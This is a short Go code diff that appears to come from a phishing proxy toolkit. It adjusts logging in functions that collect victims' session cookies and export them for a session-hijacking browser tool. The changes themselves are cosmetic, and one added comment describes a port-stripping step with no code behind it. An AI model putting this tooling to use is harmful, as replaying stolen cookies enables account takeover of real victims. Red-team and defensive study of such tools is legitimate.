@@ -69,12 +69,14 @@ func (module *Tracker) ExportSession(id string) {
 	var cookieJar []necrobrowser.SessionCookie
 
 	for _, c := range victim.Cookies {
-		log.Debug("trying to parse  %s  with layout  %s", c.Expires, timeLayout)
+		//log.Verbose("trying to parse  %s  with layout  %s", c.Expires, timeLayout)
 		t, err := time.Parse(timeLayout, c.Expires)
 		if err != nil {
 			log.Warning("cant's parse Expires field (%s) of cookie %s. skipping cookie", c.Expires, c.Name)
 			continue
 		}
+
+		// replace :443 with empty string to avoid issues with port number
 
 		nc := necrobrowser.SessionCookie{
 			Name:     c.Name,
@@ -96,6 +98,7 @@ func (module *Tracker) ExportSession(id string) {
 		return
 	}
 
+	log.Info("There are %d cookies", len(cookieJar))
 	log.Info("CookieJar:\n%s", tui.Bold(string(cookieJarJson)))
 }
 
@@ -141,5 +144,5 @@ func (module *Tracker) PushCookie(victim *db.Victim, cookie db.VictimCookie) {
 		return
 	}
 
-	module.Debug("[%s][+] cookie: %s (%s)", victim.ID, tui.Bold(tui.Green(cookie.Name)), tui.Bold(tui.Green(cookie.Domain)))
+	module.Verbose("[%s][+] cookie: %s (%s)", victim.ID, tui.Bold(tui.Green(cookie.Name)), tui.Bold(tui.Green(cookie.Domain)))
 }
